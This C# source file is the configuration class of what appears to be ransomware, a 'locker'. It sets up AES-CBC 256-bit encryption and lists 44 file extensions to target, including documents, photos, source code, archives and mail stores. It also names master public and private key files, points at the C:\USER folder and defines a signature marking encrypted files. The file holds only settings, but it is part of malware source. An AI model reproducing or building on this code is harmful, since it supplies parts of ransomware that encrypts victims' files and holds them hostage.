using System.Security.Cryptography;

namespace s0s_L_ckr;

public sealed class ConfigMgr
{
	public const PaddingMode CHPR_PAD_MOD = PaddingMode.PKCS7;

	public const CipherMode CHPR_MOD = CipherMode.CBC;

	public const int CHPR_KEY_SIZ = 256;

	public static readonly string[] TRGT_FILS = new string[44]
	{
		".JPG", ".GIF", ".PDF", ".PNG", ".NEF", ".ZIP", ".RAR", ".TAR", ".GZ", ".CS",
		".VB", ".JAVA", ".CLASS", ".JS", ".VBS", ".CSC", ".JSON", ".TXT", ".C", ".CPP",
		".H", ".CONFIG", ".PY", ".R", ".XAML", ".JSP", ".PHP", ".DOC", ".DOCX", ".XLS",
		".XLSX", ".PPT", ".PPTX", ".MP3", ".MP4", ".AVI", ".MPEG", ".PST", ".MSG", ".EML",
		".DBX", ".MBX", ".aapp", ".WAB"
	};

	public const string LOCL_PUB_KEY_NAM = "master_public_key.info";

	public const string LOCL_PRI_KEY_NAM = "master_private_key.info";

	private const string V = "C:\\USER";

	public static readonly string[] TRGT_PTH_FLR = new string[1] { "C:\\USER" };

	public static readonly byte[] FILE_SIGN = new byte[8] { 55, 55, 69, 24, 69, 24, 69, 24 };

	public static readonly int FILE_SIGN_SIZE = FILE_SIGN.Length;

	private ConfigMgr()
	{
	}
}
